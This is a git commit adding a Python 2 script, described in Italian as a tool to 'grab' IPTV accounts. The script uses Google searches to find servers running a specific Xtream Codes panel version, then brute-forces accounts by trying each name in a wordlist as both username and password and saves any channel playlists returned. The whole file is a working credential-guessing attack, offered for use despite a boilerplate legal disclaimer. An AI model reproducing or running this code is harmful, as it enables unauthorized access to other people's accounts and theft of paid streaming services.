151797df19c18d63a1cf7b3b024d94d34ae20235
pinperepette <pinperepette@gmail.com>
2015-12-08 18:07:18 +0100

    script per grabbare account iptv

---
+++ IPTV/iptv.py
@@ -0,0 +1,85 @@
+#!/usr/bin/python
+#-*- coding: utf-8 -*-
+
+#########################################################################
+#  This program is free software; you can redistribute it and/or modify #
+#  it under the terms of the GNU General Public License as published by #
+#  the Free Software Foundation; either version 2 of the License, or    #
+#  (at your option) any later version.                                  #
+#                                                                       #
+#  This program is distributed in the hope that it will be useful,      #
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
+#  GNU General Public License for more details.                         #
+#                                                                       #
+#  You should have received a copy of the GNU General Public License    #
+#  along with this program; if not, write to the Free Software          #
+#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
+#  MA 02110-1301, USA.                                                  #
+############################# DISCALIMER ################################
+#  Usage of this software for probing/attacking targets without prior   #
+#  mutual consent, is illegal. It's the end user's responsability to    #
+#  obey alla applicable local laws. Developers assume no liability and  #
+#  are not responible for any missue or damage caused by thi program    #
+#########################################################################
+
+#by Pinperepette - The Pirate 
+
+import urllib2, google, time, pyprind ,sys
+from urlparse import urlparse
+from sys import argv as s
+
+#parametri editabili
+ricerca = 'Xtream Codes v1.0.59.5'
+lista = 'nomi_italiani.txt'
+
+ 
+def print_link():
+    for url in google.search(ricerca, num=30, stop=1):
+        parsed = urlparse(url)
+        print(parsed.scheme + '://' + parsed.netloc +"\n")
+
+
+def search_account(URL):
+    righe = open( lista ,'r')
+    NR = len(righe.readlines())
+    TT = (str(NR))
+    n = NR
+    bar = pyprind.ProgBar(n, title=' ', stream=1, monitor=True)
+    tr = 0
+    with open(lista) as f:
+        content = f.readlines()
+    for r in content:
+        req = urllib2.Request( URL + '/get.php?username=%s&password=%s&type=m3u&output=mpegts'%(r.rstrip().lstrip(),r.rstrip().lstrip()))
+        response = urllib2.urlopen(req)
+        the_page = response.read()
+
+        NR = (NR - 1)
+        TM = (str(NR))
+
+        bar.update()
+        if len(the_page) > 0:
+            tr = (tr +1)
+            out_file = open("m3u/tv_channels_%s.m3u"%r.rstrip().lstrip(),"w")
+            out_file.write(the_page)
+            out_file.close()
+    trov = (str(tr))
+    print ('account trovati : ' + trov)
+
+def usage():
+    
+    print'##### USAGE #####'
+    print ("for print list server " + s[0] + " " + "-pl")
+    print ("for search account " + s[0] + " " + "http://site.server")
+ 
+if len(s) == 1:
+    usage()
+    exit()
+if s[1] == '-h':
+    usage()
+    exit()
+if s[1] == '-pl':
+    print_link()
+    exit() 
+
+search_account(s[1])
